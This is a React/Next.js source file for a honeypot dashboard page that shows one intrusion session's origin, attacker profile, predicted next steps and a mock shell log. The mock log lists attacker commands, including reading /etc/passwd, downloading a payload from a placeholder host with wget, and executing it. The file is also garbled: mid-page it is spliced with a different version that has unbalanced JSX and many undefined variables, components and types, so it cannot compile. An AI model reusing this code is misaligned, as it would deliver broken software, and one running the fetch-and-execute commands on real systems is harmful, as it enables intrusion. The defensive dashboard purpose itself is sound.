"use client";
import { use, useState, useEffect } from "react";
import { Download, MapPin, Terminal, Activity, FileText, ChevronRight, AlertTriangle } from "lucide-react";
import Link from "next/link";
import { ComposableMap, Geographies, Geography, Marker } from "react-simple-maps";
import { isDashboardThreatEvent } from "@/lib/dashboardTypes";
import type { DashboardThreatEvent } from "@/lib/dashboardTypes";

const geoUrl = "https://cdn.jsdelivr.net/npm/world-atlas@2/countries-110m.json";

export default function SessionDetailPage({ params }: { params: Promise<{ id: string }> }) {
  const resolvedParams = use(params);
  const sessionId = resolvedParams.id;

  const [threatData, setThreatData] = useState<DashboardThreatEvent | null>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchThreatDetail = async () => {
      try {
        // ดึงข้อมูลทั้งหมดมาก่อน แล้วหา ID ที่ตรงกับ URL (เพราะยังไม่มี API ดึงรายตัว)
        const res = await fetch("/api/threats");
        if (res.ok) {
          const data: unknown = await res.json();
          const found = Array.isArray(data) ? data.filter(isDashboardThreatEvent).find((t) => t.id === sessionId) : undefined;
          if (found) {
            setThreatData(found);
          }
        }
      } catch (error) {
        console.error("Failed to fetch threat details", error);
      } finally {
        setLoading(false);
      }
    };
    fetchThreatDetail();
  }, [sessionId]);

  // ข้อมูลที่ต้องรอ API ในอนาคต (Mock Data)
  const shellLogs = [
    { time: "10:42:01", cmd: "$ whoami", action: "Deceive", actionDesc: "(root)", color: "text-purple-400 border-purple-900/50 bg-purple-900/20" },
    { time: "10:42:15", cmd: "$ cat /etc/passwd", action: "Lure", actionDesc: "(Fake File)", color: "text-amber-400 border-amber-900/50 bg-amber-900/20" },
    { time: "10:43:05", cmd: "$ wget http://malicious.io/payload.sh", action: "Delay", actionDesc: "(Throttle)", color: "text-slate-300 border-slate-700 bg-slate-800" },
    { time: "10:44:30", cmd: "$ chmod +x payload.sh", action: "Deceive", actionDesc: "(Success)", color: "text-purple-400 border-purple-900/50 bg-purple-900/20" },
    { time: "10:44:45", cmd: "$ ./payload.sh", action: "Contain", actionDesc: "(Sandbox)", color: "text-red-400 border-red-900/50 bg-red-900/20" },
    { time: "10:45:12", cmd: "$ nmap -sV 10.0.0.0/24", action: "Analyzing...", actionDesc: "", color: "text-slate-500 border-transparent bg-transparent animate-pulse" },
  ];

  if (loading) {
    return <div className="flex h-full items-center justify-center text-slate-500 font-mono text-sm animate-pulse min-h-[500px]">RETRIEVING FORENSIC DATA...</div>;
  }

  if (!threatData) {
    return <div className="flex h-full items-center justify-center text-red-500 font-mono text-sm min-h-[500px]">ERROR: SESSION ARCHIVED OR NOT FOUND</div>;
  }

  // เตรียมข้อมูลจริงสำหรับแสดงผล
  const originIp = threatData?.sourceIp || "Unknown";
  const country = threatData?.geo?.country || "Unknown";
  const city = threatData?.geo?.city || "Unknown";
  const lat = threatData?.geo?.lat || 0;
  const lon = threatData?.geo?.lon || 0;
  const severity = threatData?.severity?.toUpperCase() || "UNKNOWN";
  const classification = threatData?.classification || "UNKNOWN";
  const confidenceScore = severity === "CRITICAL" ? "94%" : severity === "HIGH" ? "78%" : "45%";
  
  return (
    <div className="space-y-6 animate-in fade-in duration-500 pb-10 max-w-[1400px] mx-auto">
      
      {/* ---------------- Header & Breadcrumbs ---------------- */}
      <div className="flex flex-col gap-2 mb-6">
        <div className="text-[10px] font-mono text-slate-500 uppercase tracking-widest flex items-center gap-2">
           <Link href="/dashboard" className="hover:text-purple-400">SESSION ANALYSIS</Link> 
           <ChevronRight className="w-3 h-3" /> 
           <span className="text-purple-400 uppercase">{sessionId.substring(0, 8)}...</span>
        </div>
        <div className="flex justify-between items-center">
          <h1 className="text-3xl font-bold text-white flex items-center gap-3">
             Active Intrusion Session 
             <span className="px-2 py-0.5 bg-red-500/20 text-red-500 text-[10px] border border-red-500/50 rounded flex items-center gap-1.5 font-mono">
               <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span> LIVE
             </span>
          </h1>
          <button className="flex items-center gap-2 text-xs font-mono text-slate-300 bg-slate-800/50 border border-slate-700 px-4 py-2 rounded-md hover:bg-slate-700 transition">
             <FileText className="w-4 h-4" /> Download Session PDF
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        
        {/* ---------------- Forensic Target Metadata ---------------- */}
        <div className="lg:col-span-2 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md flex flex-col">
          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
             <MapPin className="w-5 h-5 text-purple-400" /> Forensic Target Metadata
          </h3>
          <div className="grid grid-cols-3 gap-4 mb-6">
            <div>
              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">ORIGIN IP</p>
              <p className="text-lg font-mono text-purple-300">{originIp}</p>
            </div>
            <div>
              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">GEO-LOCATION</p>
              <p className="text-sm text-slate-200 flex items-start gap-1">
                 <MapPin className="w-3 h-3 text-slate-500 mt-1 shrink-0" />
                 {city !== "Unknown" ? `${city}, ` : ""}{country}
              </p>
            </div>
            <div>
              <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">SESSION DURATION</p>
              <p className="text-lg font-mono text-slate-200">-</p> {/* รอข้อมูลจริง */}
            </div>
          </div>
          
          {/* แผนที่ข้อมูลจริง */}
          <div className="w-full h-[120px] bg-[#09090b] border border-slate-800/50 rounded-lg relative overflow-hidden mt-4">
            <ComposableMap
              projection="geoMercator"
              projectionConfig={{
                scale: 1200, 
                center: [lon, lat] // ใช้พิกัดจริงจากข้อมูล
              }}
              style={{ width: "100%", height: "100%", outline: "none" }}
            >
              <Geographies geography={geoUrl}>
                {({ geographies }) =>
                  geographies.map((geo) => (
                    <Geography
                      key={geo.rsmKey}
                      geography={geo}
                      fill="#16161d"
                      stroke="#27272a"
                      strokeWidth={0.5}
                      style={{
                        default: { outline: "none" },
                        hover: { fill: "#27272a", outline: "none" },
                        pressed: { outline: "none" },
                      }}
                    />
                  ))
                }
              </Geographies>
              
              {/* จุดแจ้งเตือนตามพิกัดจริง */}
              {(lat !== 0 && lon !== 0) && (
                <Marker coordinates={[lon, lat]}>
                  <circle r={6} fill="#a855f7" />
                  <circle r={14} fill="#a855f7" opacity={0.4} className="animate-ping" />
                  <text
                    textAnchor="middle"
                    y={-22}
                    style={{ 
                      fontFamily: "monospace", 
                      fontSize: "22px", 
                      fill: "#ffffff", 
                      fontWeight: "bold",
                      textShadow: "2px 2px 4px rgba(0,0,0,0.9), -1px -1px 0 #000" 
                    }}
                  >
                    TARGET_NODE
                  </text>
                </Marker>
              )}
            </ComposableMap>
            
            <div className="absolute bottom-3 right-4 text-[9px] font-mono text-slate-600 tracking-widest pointer-events-none">
              GEOSPATIAL TRACE ACTIVE •
            </div>
          </div>
        </div>

        {/* ---------------- Attacker Profile ---------------- */}
        <div className="bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
             <Activity className="w-5 h-5 text-amber-500" /> Attacker Profile
          </h3>
          <div className="flex justify-between items-end mb-8">
             <div>
               <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">CLASSIFICATION</p>
               <p className="text-3xl font-bold text-slate-200">{classification}</p>
             </div>
             <div className="text-right">
               <p className="text-[10px] font-mono text-slate-500 tracking-wider mb-1">CRITICALITY</p>
               <p className={`text-xs font-mono font-bold px-2 py-0.5 rounded border ${
                 severity === 'CRITICAL' ? 'text-red-400 border-red-900 bg-red-950/30' : 
                 severity === 'HIGH' ? 'text-orange-400 border-orange-900 bg-orange-950/30' : 
                 'text-amber-400 border-amber-900 bg-amber-950/30'
               }`}>
                 {severity}
               </p>
             </div>
          </div>
          <div>
             <div className="flex justify-between text-xs font-mono text-slate-400 mb-2">
               <span>Confidence Score</span>
               <span>{confidenceScore}</span>
             </div>
             <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-purple-500 shadow-[0_0_8px_#a855f7]" style={{ width: confidenceScore }}></div>
             </div>
          </div>
        </div>
      )}

      {detail && (
        <>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <DetailMetric label="SOURCE" value={text(overview.src_ip, "unavailable")} detail={text(overview.src_ip_scope, "scope unavailable")} icon={<Database className="w-4 h-4 text-purple-400" />} />
            <DetailMetric label="ANALYSIS STATUS" value={status} detail={text(overview.job_status || overview.analysis_status, "not recorded")} icon={<ShieldCheck className="w-4 h-4 text-emerald-400" />} tone={status === "failed" ? "red" : "normal"} />
            <DetailMetric label="COMMAND EVENTS" value={String(overview.command_count ?? "—")} detail="Text remains redacted by API boundary" icon={<GitBranch className="w-4 h-4 text-amber-400" />} tone="amber" />
            <DetailMetric label="SESSION START" value={formatTimestamp(overview.start_time)} detail={`Updated ${formatTimestamp(overview.updated_at)}`} icon={<CheckCircle2 className="w-4 h-4 text-slate-300" />} />
          </div>

        {/* ---------------- Live Interaction Shell (MOCK) ---------------- */}
        <div className="lg:col-span-2 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
          <div className="flex justify-between items-center mb-6">
             <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2">
                <Terminal className="w-5 h-5 text-slate-400" /> Live Interaction Shell
             </h3>
             <span className="text-[10px] font-mono text-purple-400 flex items-center gap-1.5">
               <span className="w-1.5 h-1.5 rounded-full bg-purple-500 animate-pulse"></span> Recording
             </span>
          </div>
          
          <div className="bg-[#0a0a0c] border border-slate-800/50 rounded-lg p-4 font-mono text-xs overflow-x-auto">
             <table className="w-full text-left border-collapse">
               <thead>
                 <tr className="text-slate-500 border-b border-slate-800/50">
                   <th className="pb-3 w-24 font-normal">Time</th>
                   <th className="pb-3 font-normal">Attacker Command</th>
                   <th className="pb-3 w-32 font-normal text-right">Honeypot Action</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-slate-800/30">
                 {shellLogs.map((log, i) => (
                   <tr key={i} className="text-slate-300">
                     <td className="py-3 text-slate-500">{log.time}</td>
                     <td className="py-3 text-emerald-400/80">{log.cmd}</td>
                     <td className="py-3 text-right">
                       <div className="flex flex-col items-end gap-1">
                          <span className={`px-2 py-0.5 rounded text-[10px] border ${log.color}`}>
                            {log.action}
                          </span>
                          {log.actionDesc && <span className="text-[9px] text-slate-500">{log.actionDesc}</span>}
                       </div>
                     </td>
                   </tr>
                 ))}
               </tbody>
             </table>
          </div>
        </div>

        {/* ---------------- Predict Next Step (MOCK) ---------------- */}
        <div className="bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-6">
             <Activity className="w-5 h-5 text-purple-400" /> Predict Next Step
          </h3>
          <div className="space-y-6">
             <div>
               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
                 <span>Lateral Movement</span>
                 <span className="text-red-400">88%</span>
               </div>
               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-red-400 w-[88%]"></div></div>
             </div>
             <div>
               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
                 <span>Data Exfiltration</span>
                 <span className="text-amber-400">72%</span>
               </div>
               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-amber-400 w-[72%]"></div></div>
             </div>
             <div>
               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
                 <span>Privilege Escalation</span>
                 <span className="text-purple-400">45%</span>
               </div>
               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-purple-400 w-[45%]"></div></div>
             </div>
             <div>
               <div className="flex justify-between text-xs font-mono text-slate-300 mb-2">
                 <span>Install Persistence</span>
                 <span className="text-slate-500">12%</span>
               </div>
               <div className="w-full h-1.5 bg-slate-800 rounded-full overflow-hidden"><div className="h-full bg-slate-500 w-[12%]"></div></div>
             </div>
          </div>
        </div>

        {/* ---------------- Threat Hypothesis Summary (MOCK) ---------------- */}
        <div className="lg:col-span-3 bg-[#111116] border border-slate-800/80 rounded-xl p-6 shadow-md">
          <h3 className="text-lg font-bold text-slate-200 flex items-center gap-2 mb-4">
             <AlertTriangle className="w-5 h-5 text-amber-500" /> Threat Hypothesis Summary
          </h3>
          <div className="p-4 bg-[#15151c] border border-slate-800 rounded-lg text-sm text-slate-400 leading-relaxed font-mono">
            Based on the interaction sequence, the actor is attempting to map internal network topology following a successful initial compromise via SQL Injection. The execution of a secondary payload script suggests preparation for lateral movement, likely targeting domain controllers or credential stores. The honeypot&apos;s deception tactics (providing fake `/etc/passwd` and sandboxing the payload) have currently stalled their primary objective, forcing them into a reconnaissance loop using `nmap`. High probability of attempted data exfiltration if lateral movement is perceived as successful by the attacker.
          </div>
        </div>

      </div>
      <p className="text-[10px] text-slate-600 mt-3 leading-relaxed">
        {failClosed
          ? "Policy flags unavailable or unverified; display is fail-closed to manual-only and is not execution authorization."
          : "Stored policy flags are displayed as advisory metadata; this dashboard cannot execute actions."}
      </p>
    </div>
  );
}

function EvidencePanel({ title, subtitle, icon, tone, children }: { title: string; subtitle: string; icon: React.ReactNode; tone: "emerald" | "amber" | "purple"; children: React.ReactNode }) {
  const border = tone === "emerald" ? "border-emerald-900/40" : tone === "amber" ? "border-amber-900/40" : "border-purple-900/40";
  return (
    <div className={`bg-[#111116] border ${border} p-5 rounded-xl min-h-[220px]`}>
      <div className="flex items-start gap-3 mb-4"><span className="mt-0.5">{icon}</span><div><h3 className="text-sm font-semibold text-white">{title}</h3><p className="text-[10px] text-slate-500 mt-1 leading-relaxed">{subtitle}</p></div></div>
      <div className="space-y-2">{children}</div>
    </div>
  );
}

function EvidenceRow({ item }: { item: unknown }) {
  const record = asRecord(item);
  return <div className="bg-[#18181b] border border-slate-800/60 rounded px-3 py-2"><div className="text-xs text-emerald-200">{safeLabel(item)}</div><div className="text-[10px] text-slate-500 mt-1">{text(record.tactic || record.source || record.evidence_tier, "trace metadata unavailable")}</div></div>;
}

function PredictionRow({ item }: { item: JsonRecord }) {
  const score = item.score ?? item.weighted_score;
  return <div className="bg-[#18181b] border border-slate-800/60 rounded px-3 py-2"><div className="flex justify-between gap-3 text-xs text-amber-200"><span>{safeLabel(item)}</span>{score !== undefined && <span className="font-mono text-amber-300/80">score {String(score)}</span>}</div><div className="text-[10px] text-slate-500 mt-1">{text(item.source_types || item.sources, "model source metadata unavailable")}</div></div>;
}

function CorrelationRow({ item }: { item: JsonRecord }) {
  const strength = item.strength ?? item.confidence;
  return <div className="bg-[#18181b] border border-slate-800/60 rounded px-3 py-2"><div className="flex justify-between gap-3 text-xs text-purple-200"><span>{safeLabel(item)}</span>{strength !== undefined && <span className="font-mono text-purple-300/80">strength {String(strength)}</span>}</div><div className="text-[10px] text-slate-500 mt-1">{text(item.confidence_semantics, "developer-defined heuristic")}</div></div>;
}

function EventRow({ event }: { event: EventView }) {
  return <tr className="border-b border-slate-800/60"><td className="py-3 pr-4 text-slate-400">{formatTimestamp(event.timestamp || event.received_at)}</td><td className="py-3 pr-4 text-purple-300">{text(event.eventid || event.event_id, "unknown")}</td><td className="py-3 pr-4 text-slate-400">{text(event.sensor_id || event.sensor, "unknown")}</td><td className="py-3 pr-4 text-slate-400">{text(event.src_ip, "unavailable")}</td><td className="py-3 text-slate-500">{event.command_event ? "yes · text redacted" : "no"}</td></tr>;
}

function DetailMetric({ label, value, detail, icon, tone = "normal" }: { label: string; value: string; detail: string; icon: React.ReactNode; tone?: "normal" | "amber" | "red" }) {
  const valueColor = tone === "red" ? "text-[#fca5a5]" : tone === "amber" ? "text-amber-300" : "text-white";
  return <div className="bg-[#111116] border border-slate-800/50 p-5 rounded-xl min-h-[132px]"><div className="flex items-center justify-between"><span className="text-[10px] text-slate-500 tracking-wider">{label}</span>{icon}</div><div className={`text-lg font-bold mt-3 ${valueColor} truncate`}>{value}</div><div className="text-[10px] text-slate-500 mt-2 truncate">{detail}</div></div>;
}

function KeyValue({ label, value }: { label: string; value: string }) {
  return <div className="flex justify-between gap-4"><span className="text-slate-500">{label}</span><span className="text-slate-300 text-right truncate">{value}</span></div>;
}

function EmptyState({ text: message }: { text: string }) {
  return <div className="text-[11px] text-slate-500 text-center py-6">{message}</div>;
}

function asRecord(value: unknown): JsonRecord {
  return value && typeof value === "object" && !Array.isArray(value) ? value as JsonRecord : {};
}

function predictionRanking(prediction: JsonRecord | null): JsonRecord[] {
  if (!prediction) return [];
  const ranking = prediction.final_ranking || prediction.prediction;
  return Array.isArray(ranking) ? ranking.filter((item): item is JsonRecord => Boolean(item && typeof item === "object" && !Array.isArray(item))) : [];
}

function buildTimeline(events: EventView[]) {
  return events.slice(0, 50).reverse().map((event, index) => ({
    time: shortTime(event.timestamp || event.received_at, index),
    events: index + 1,
  }));
}

function shortTime(value: unknown, fallback: number): string {
  const parsed = new Date(text(value, "")).getTime();
  if (!Number.isFinite(parsed)) return `#${fallback + 1}`;
  return new Date(parsed).toISOString().slice(11, 19);
}
